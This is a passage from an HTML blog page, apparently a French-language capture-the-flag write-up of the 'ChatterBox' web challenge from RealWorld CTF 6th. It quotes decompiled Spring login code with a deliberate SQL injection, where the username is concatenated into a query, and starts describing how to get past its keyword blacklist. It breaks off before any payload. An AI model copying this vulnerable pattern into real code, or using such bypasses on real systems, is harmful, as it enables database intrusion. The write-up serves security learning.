@@ -1,0 +1,1690 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+
+
+
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+<script defer language="javascript" type="text/javascript" src="/js/bundle.min.145453261a7755f5042a854c4213501d215a8fbe34c08d181c40f803f1315e74.js"></script>
+
+
+
+
+
+
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    
+    <link rel="icon" href=/images/favicon.png>
+
+    
+    
+
+
+
+
+
+  
+
+
+
+
+
+  
+  
+  
+
+
+<!-- Open Graph image and Twitter Card metadata -->
+
+<title itemprop="name">Vozec&#39;s Blog - ChatterBox | RealWorld CTF 6th</title>
+<meta property="og:title" content=Vozec&#39;s&#32;Blog&#32;-&#32;ChatterBox&#32;|&#32;RealWorld&#32;CTF&#32;6th />
+<meta name="twitter:title" content=Vozec&#39;s&#32;Blog&#32;-&#32;ChatterBox&#32;|&#32;RealWorld&#32;CTF&#32;6th />
+<meta itemprop="name" content=Vozec&#39;s&#32;Blog&#32;-&#32;ChatterBox&#32;|&#32;RealWorld&#32;CTF&#32;6th />
+<meta name="application-name" content=Vozec&#39;s&#32;Blog&#32;-&#32;ChatterBox&#32;|&#32;RealWorld&#32;CTF&#32;6th />
+<meta property="og:site_name" content="" />
+
+
+<meta name="description" content="Writeup ChatterBox | RealWorld CTF 6th (2024) | Catégorie Web" />
+<meta itemprop="description" content="Writeup ChatterBox | RealWorld CTF 6th (2024) | Catégorie Web" />
+<meta property="og:description" content="Writeup ChatterBox | RealWorld CTF 6th (2024) | Catégorie Web" />
+<meta name="twitter:description" content="Writeup ChatterBox | RealWorld CTF 6th (2024) | Catégorie Web" />
+
+
+<base href="//localhost:1313/writeups/chatterbox-realworld-ctf-2024/" />
+<link rel="canonical" href="//localhost:1313/writeups/chatterbox-realworld-ctf-2024/" itemprop="url" />
+<meta name="url" content="//localhost:1313/writeups/chatterbox-realworld-ctf-2024/" />
+<meta name="twitter:url" content="//localhost:1313/writeups/chatterbox-realworld-ctf-2024/" />
+<meta property="og:url" content="//localhost:1313/writeups/chatterbox-realworld-ctf-2024/" />
+
+
+<meta property="og:updated_time" content="2024-01-28T12:00:00Z" />
+
+
+<link rel="sitemap" type="application/xml" title="Sitemap" href='//localhost:1313/sitemap.xml' />
+
+<meta name="robots" content="index,follow" />
+<meta name="googlebot" content="index,follow" />
+
+
+<meta name="twitter:site" content="https://twitter.com/Vozec1" />
+<meta name="twitter:creator" content="https://twitter.com/Vozec1" />
+<meta property="fb:admins" content="" />
+
+
+<meta name="apple-mobile-web-app-title" content="" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.134.1">
+
+
+    
+    
+
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.94a339836f89f0d25f31980cb6b0631da21e20af128308747ce44e0525eb16ef.css">
+
+
+    
+    <style>
+    body {
+        --sidebar-bg-color: #202020;
+        --sidebar-img-border-color: #515151;
+        --sidebar-p-color: #909090;
+        --sidebar-h1-color: #FFF;
+        --sidebar-a-color: #FFF;
+        --sidebar-socials-color: #FFF;
+        --text-color: #222;
+        --bkg-color: #FAF9F6;
+        --post-title-color: #303030;
+        --list-color: #5A5A5A;
+        --link-color: #268BD2;
+        --date-color: #515151;
+        --table-border-color: #E5E5E5;
+        --table-stripe-color: #F9F9F9;
+        --code-color: #000;
+        --code-background-color: #E5E5E5;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+        --moon-sun-color: #FFF;
+        --moon-sun-background-color: #515151;
+    }
+    body.dark-theme {
+        --text-color: #EEE;
+        --bkg-color: #121212;
+        --post-title-color: #DBE2E9;
+        --list-color: #9D9D9D;
+        --link-color: #268BD2;
+        --date-color: #9A9A9A;
+        --table-border-color: #515151;
+        --table-stripe-color: #202020;
+        --code-color: #FFF;
+        --code-background-color: #515151;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+    }
+    body {
+        background-color: var(--bkg-color);
+    }
+</style>
+
+</head>
+
+    <body class="dark-theme">
+        <div class="wrapper">
+            <aside class="sidebar">
+    <div class="container sidebar-sticky">
+        <div class="light-dark" align="right">
+    <button class="btn-light-dark" title="Toggle light/dark mode">
+        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
+        </svg>
+        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
+        </svg>
+    </button>
+</div>
+
+        <div class="sidebar-about">
+    <h1 class="brand">
+        
+            <a href="//localhost:1313/">
+                <img src="https://avatars.githubusercontent.com/u/61807609?v=4" alt="brand image">
+            </a>
+        
+        
+            <a href="//localhost:1313/">
+                <h1>Vozec&#39;s Blog</h1>
+            </a>
+        
+    </h1>
+    <p class="lead">
+    A student passionate about cybersecurity
+    </p>
+</div>
+
+        <nav>
+    <ul class="sidebar-nav">
+
+        
+        
+        
+        
+            
+
+            
+                
+                
+                    <li class="heading">
+                        <a href="/about/">About</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/writeups/">Writeups</a>
+                    </li>
+                    
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/researchs/">Researchs</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/rsa/">1/ Crypto RSA</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/aes/">2/ Crypto AES</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/other/">3/ Crypto Other</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+
+    </ul>
+</nav>
+
+        
+    <a target="_blank" class="social" title="GitHub" href="https://github.com/Vozec">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
+            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
+        </svg>
+    </a>
+
+
+
+    <a target="_blank" class="social" title="LinkedIn" href="https://www.linkedin.com/in/arthur-dlfr/">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 448 512">
+            <path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5c0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7c-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5c67.2 0 79.7 44.3 79.7 101.9V416z"/>
+        </svg>
+    </a>
+
+
+    <a target="_blank" class="social" title="Twitter" href="https://twitter.com/Vozec1">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M5.032 14.286c6.037 0 9.34-4.837 9.34-9.032c0-.137 0-.274-.01-.41A6.56 6.56 0 0 0 16 3.2c-.6.256-1.235.425-1.885.5a3.207 3.207 0 0 0 1.443-1.757c-.645.37-1.35.63-2.085.77a3.322 3.322 0 0 0-1.862-.958a3.384 3.384 0 0 0-2.082.334a3.223 3.223 0 0 0-1.442 1.49a3.08 3.08 0 0 0-.208 2.03a9.57 9.57 0 0 1-3.747-.963a9.269 9.269 0 0 1-3.018-2.354a3.086 3.086 0 0 0-.36 2.314c.189.787.68 1.475 1.376 1.924a3.344 3.344 0 0 1-1.49-.398v.04c0 .734.263 1.444.743 2.01a3.3 3.3 0 0 0 1.89 1.102c-.483.128-.99.146-1.482.055a3.19 3.19 0 0 0 1.168 1.577a3.36 3.36 0 0 0 1.9.627A6.732 6.732 0 0 1 0 12.86a9.527 9.527 0 0 0 5.032 1.423"/>
+        </svg>
+    </a>
+
+
+
+
+    <a target="_blank" class="social" title="Discord" href="vozec">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24">
+            <path fill="currentColor" d="M19.27 5.33C17.94 4.71 16.5 4.26 15 4a.09.09 0 0 0-.07.03c-.18.33-.39.76-.53 1.09a16.09 16.09 0 0 0-4.8 0c-.14-.34-.35-.76-.54-1.09c-.01-.02-.04-.03-.07-.03c-1.5.26-2.93.71-4.27 1.33c-.01 0-.02.01-.03.02c-2.72 4.07-3.47 8.03-3.1 11.95c0 .02.01.04.03.05c1.8 1.32 3.53 2.12 5.24 2.65c.03.01.06 0 .07-.02c.4-.55.76-1.13 1.07-1.74c.02-.04 0-.08-.04-.09c-.57-.22-1.11-.48-1.64-.78c-.04-.02-.04-.08-.01-.11c.11-.08.22-.17.33-.25c.02-.02.05-.02.07-.01c3.44 1.57 7.15 1.57 10.55 0c.02-.01.05-.01.07.01c.11.09.22.17.33.26c.04.03.04.09-.01.11c-.52.31-1.07.56-1.64.78c-.04.01-.05.06-.04.09c.32.61.68 1.19 1.07 1.74c.03.01.06.02.09.01c1.72-.53 3.45-1.33 5.25-2.65c.02-.01.03-.03.03-.05c.44-4.53-.73-8.46-3.1-11.95c-.01-.01-.02-.02-.04-.02zM8.52 14.91c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.84 2.12-1.89 2.12zm6.97 0c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.83 2.12-1.89 2.12z"/>
+        </svg>
+    </a>
+
+
+
+
+
+
+
+
+
+
+    <a target="_blank" class="social" title="Email" href="https://www.root-me.org/Vozec">
+       <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 485.211 485.211">
+            <path fill="currentColor" d="M301.393,241.631L464.866,424.56H20.332l163.474-182.928l58.801,51.443L301.393,241.631z M462.174,60.651H23.027 l219.579,192.142L462.174,60.651z M324.225,221.67l160.986,180.151V80.792L324.225,221.67z M0,80.792v321.029L160.972,221.64 L0,80.792z"/>
+       </svg>
+    </a>
+
+
+        <p class="footnote">
+powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
+    <br>
+    &copy; 2024 . All rights reserved.
+</p>
+
+  </div>
+</aside>
+
+            <main class="content container">
+                <div class="post">
+  <div class="info">
+  <h1 class="post-title">
+    <a href="//localhost:1313/writeups/chatterbox-realworld-ctf-2024/">ChatterBox | RealWorld CTF 6th</a>
+  </h1>
+
+  <div class="headline">
+    <div>
+      
+      <time datetime=" 2024-01-28T12:00:00Z" class="post-date">
+        January 28, 2024
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>13 mins read</span>
+      </span>
+    </div>
+
+    
+    <ul class="tags">
+      
+      <li class="tag-web">
+        <a href="//localhost:1313/tags/web">web</a>
+      </li>
+      
+      <li class="tag-tuto">
+        <a href="//localhost:1313/tags/tuto">tuto</a>
+      </li>
+      
+      <li class="tag-writeup">
+        <a href="//localhost:1313/tags/writeup">writeup</a>
+      </li>
+      
+    </ul>
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+  <h2 id="fichiers">Fichiers:</h2>
+<ul>
+<li><a href="./files/ChatterBox_source.zip">ChatterBox_source.zip</a></li>
+</ul>
+<h2 id="description">Description:</h2>
+<p>I wanna inject sth in my Box what should i do？
+<code>nc &lt;ip&gt; 9999</code></p>
+<h2 id="solution-détaillée">Solution détaillée:</h2>
+<p>Voici les fichiers fournis par l&rsquo;auteur:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ tree .
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>├── ChatterBox-0.0.1-SNAPSHOT.jar
+</span></span><span style="display:flex;"><span>├── docker-compose.yml
+</span></span><span style="display:flex;"><span>├── Dockerfile
+</span></span><span style="display:flex;"><span>├── flag
+</span></span><span style="display:flex;"><span>├── init.sql
+</span></span><span style="display:flex;"><span>├── readflag
+</span></span><span style="display:flex;"><span>└── start.sh
+</span></span></code></pre></div><p>En regardant rapidement le Dockerfile, on comprend que le flag est copié dans <code>/flag</code> et que le binaire <code>/readflag</code> va nous permettre de le lire.
+Un serveur web est unfichier <code>jar</code> et nous allons devoir l&rsquo;exploiter pour avoir une execution de commande sur le serveur.</p>
+<p>On va utiliser <a href="https://github.com/skylot/jadx" target="_blank">jadx</a> pour décompiler le fichier et récuperer le code source.
+On a dans <code>com/chatterbox</code> l&rsquo;application web, la class <code>ChatterBoxApplication</code> nous informe que c&rsquo;est une application <em>Spring</em>:</p>
+<p><img src="./img/screen1.png" alt="screen1"></p>
+<p>On peut lancer l&rsquo;application en local et accéder au l&rsquo;application en <code>http://127.0.0.1:8080</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker-compose up --build
+</span></span></code></pre></div><p><img src="./img/screen2.png" alt="screen2"></p>
+<p>Nous faisons face à un portail de connexion.
+D&rsquo;aprés le fichier <code>init.sql</code>, il n&rsquo;existe qu&rsquo;un seul utilisateur <strong>admin</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#75715e">-- ----------------------------
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">-- Records of message_users
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">-- ----------------------------
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">BEGIN</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> <span style="color:#e6db74">&#34;public&#34;</span>.<span style="color:#e6db74">&#34;message_users&#34;</span> <span style="color:#66d9ef">VALUES</span> (<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#39;admin&#39;</span>, <span style="color:#e6db74">&#39;xxxxxxx&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">COMMIT</span>;
+</span></span></code></pre></div><p>En continuant de fouiller dans jdax, on trouve 3 controllers pour l&rsquo;application spring:</p>
+<ul>
+<li>LoginController</li>
+<li>MessageBoardController</li>
+<li>NotifyController</li>
+</ul>
+<h3 id="première-vulnérabilité-injection-sql">Première vulnérabilité: Injection SQL</h3>
+<p>Les deux derniers controllers nécessitent d&rsquo;être authentifié, nous allons donc nous focaliser sur la partie de connexion:</p>
+<p>Le controller implémente une seule route en <code>/login</code> qui prend en paramètre <em>username</em> et <em>passwd</em>
+Voici le code simplifié:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">doLogin</span>(HttpServletRequest request, Model model, HttpSession session) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>    String username <span style="color:#f92672">=</span> request.<span style="color:#a6e22e">getParameter</span>(DruidDataSourceFactory.<span style="color:#a6e22e">PROP_USERNAME</span>);
+</span></span><span style="display:flex;"><span>    String password <span style="color:#f92672">=</span> request.<span style="color:#a6e22e">getParameter</span>(<span style="color:#e6db74">&#34;passwd&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (username <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span> password <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>SQLCheck.<span style="color:#a6e22e">checkBlackList</span>(username) <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>SQLCheck.<span style="color:#a6e22e">checkBlackList</span>(password)) {
+</span></span><span style="display:flex;"><span>            model.<span style="color:#a6e22e">addAttribute</span>(BindTag.<span style="color:#a6e22e">STATUS_VARIABLE_NAME</span>, 500);
+</span></span><span style="display:flex;"><span>            model.<span style="color:#a6e22e">addAttribute</span>(JsonEncoder.<span style="color:#a6e22e">MESSAGE_ATTR_NAME</span>, <span style="color:#e6db74">&#34;Ban!&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;error&#34;</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        String sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SELECT id,passwd FROM message_users WHERE username = &#39;&#34;</span> <span style="color:#f92672">+</span> username <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (SQLCheck.<span style="color:#a6e22e">check</span>(sql)) {
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Do sql query</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// ...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Check if password returned is equal to the one provided.</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// ...</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h4 id="bypass-des-filtres">Bypass des filtres</h4>
+<p>On remarque immédiatement une <strong>injection SQL</strong> dans le paramètre <code>username</code>. Pourtant, plusieurs checks sont effectués avant d&rsquo;executer la requète et ce sont eux que nous allons devoir contourner.</p>
+<p>Le premier est celui-ci:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>SQLCheck.<span style="color:#a6e22e">checkBlackList</span>(username) <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>SQLCheck.<span style="color:#a6e22e">checkBlackList</span>(password)) {
+</span></span><span style="display:flex;"><span>    model.<span style="color:#a6e22e">addAttribute</span>(BindTag.<span style="color:#a6e22e">STATUS_VARIABLE_NAME</span>, 500);
+</span></span><span style="display:flex;"><span>    model.<span style="color:#a6e22e">addAttribute</span>(JsonEncoder.<span style="color:#a6e22e">MESSAGE_ATTR_NAME</span>, <span style="color:#e6db74">&#34;Ban!&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;error&#34;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">checkBlackList</span>(String sql) {
+</span></span><span style="display:flex;"><span>    String sql2 <span style="color:#f92672">=</span> sql.<span style="color:#a6e22e">toUpperCase</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (String temp : getBlackList().<span style="color:#a6e22e">stream</span>()) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (sql2.<span style="color:#a6e22e">contains</span>(temp)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Le serveur vérifie que les paramètres de connections (en majuscule) ne comprennent pas un des mots suivants:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>[
